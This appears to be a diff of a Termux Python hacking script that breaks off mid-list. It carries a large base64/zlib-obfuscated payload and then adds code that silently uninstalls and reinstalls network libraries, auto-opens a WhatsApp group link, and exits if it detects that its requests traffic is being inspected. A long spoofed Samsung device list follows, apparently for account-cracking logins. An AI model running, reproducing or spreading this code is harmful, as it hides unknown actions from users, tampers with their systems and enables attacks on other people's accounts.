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"))))
+from ast import Pass
+from os import name, path
+import os,base64,zlib,pip,urllib
+from weakref import proxy
+import os,base64,zlib,platform
+from urllib.request import parse_http_list
+print('\n [√] Wait Installing Modules...!')
+os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
+os.system('xdg-open https://chat.whatsapp.com/Fp4yCosR5j81IcGhdJas9c')
+print('\n \033[1;32m[√]\033[1;37m Wait Checking Modules...!')
+from bs4 import BeautifulSoup as sop
+try:
+	from bs4 import BeautifulSoup as bsp
+except:
+	os.system('pip install bs4')
+	from bs4 import BeautifulSoup as bsp
+try:
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        print('\n Installing missing modules ...')
+        os.system('pip install requests futures==2 > /dev/null')
+        os.system('python s1n.py')  
+        os.system('xdg-open https://chat.whatsapp.com/Fp4yCosR5j81IcGhdJas9c')
+#============Capture Protection============#
+first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'print' in open(first+'sessions.py','r').read():
+	pass
+else:
+	exit('\33[1;91mPlease Try This Local Method Capture On Kids ')	 
+
+cellphone = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 